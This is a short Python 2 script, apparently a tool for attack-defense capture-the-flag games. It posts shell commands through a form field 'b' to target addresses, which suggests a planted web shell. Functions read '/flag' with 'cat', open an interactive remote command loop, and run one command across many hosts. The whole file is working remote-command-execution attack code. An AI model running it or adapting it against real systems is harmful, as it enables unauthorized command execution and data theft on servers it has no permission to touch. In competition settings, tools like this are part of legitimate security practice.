import requests

def get_flag(address):
	try:
		data = {'b':'cat /flag'}
		r = requests.post(address,data=data)
		if (r.text != ''):
			print "Get Flag Succeed."
			print "Flag:",r.text
			print "*******************************************************" 
		else:
			print "Get Flag Failed."
			print "*******************************************************" 
	except:
		print "Get Flag Failed."
		print "*******************************************************" 
		
def get_store_flag(address):
	try:
		data = {'b':'cat /flag'}
		r = requests.post(address,data=data)
		if (r.text != ''):
			print "Get Flag Succeed."
			return r.text
		if (r.text == ''):
			print "Get Flag Failed."
			return "NULL"
			print "*******************************************************" 
		else:
			print "Get Flag Failed."
			print "*******************************************************" 
	except:
		print "Get Flag Failed."
		print "*******************************************************" 
		
def rce(address):
	try:
		command = raw_input("Command(Input stop To Exit.):")
		if command == 'stop':
			return 1
			exit()
		data = {'b':command}
		r = requests.post(address,data=data)
		print r.text
		print "*******************************************************" 
	except:
		print "Rce Failed."

def rce_multi(address,command):
	try:
		data = {'b':command}
		r = requests.post(address,data=data)
		if r.text != '':
			print address,":"
			print r.text
			print "*******************************************************" 
	except:
		print "Rce Failed."